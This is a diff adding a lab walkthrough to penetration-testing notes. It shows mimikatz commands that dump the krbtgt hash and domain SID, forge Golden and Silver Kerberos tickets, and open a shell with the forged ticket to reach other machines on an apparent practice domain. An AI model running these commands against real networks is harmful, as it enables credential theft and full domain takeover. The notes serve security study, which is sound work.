@@ -144,3 +144,52 @@ dir \\controller.local\admin$
 
 ## Golden/Silver Ticket Attacks w/ mimikatz
 
+### Dump the krbtgt hash
+
+Run mimikatz:
+
+```powershell
+mimikatz.exe
+```
+
+Check privilege:
+
+```powershell
+privilege::debug
+```
+
+Dump the hash as well as the security identifier (SID) needed to create a **Golden Ticket**.&#x20;
+
+```powershell
+lsadump::lsa /inject /name:krbtgt
+```
+
+{% hint style="info" %}
+To create a **silver ticket** you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
+{% endhint %}
+
+### Create a Golden/Silver Ticket
+
+Create a golden ticket:
+
+```powershell
+Kerberos::golden /user:Administrator /domain:controller.local /sid:[SID] /krbtgt:[ntlm hash of krbgtg] /id:[userID]
+```
+
+{% hint style="info" %}
+To create a **silver ticket** simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103
+{% endhint %}
+
+### Use the Golden/Silver Ticket to access other machines
+
+Open a new elevated command prompt with the given ticket in mimikatz:
+
+```powershell
+misc::cmd
+```
+
+{% hint style="info" %}
+Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from, however, if you took the ticket from krbtgt you have access to the **ENTIRE** network hence the name **Golden Ticket**; however, **Silver Tickets** only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
+{% endhint %}
+
+To test it, again look at shares of other users
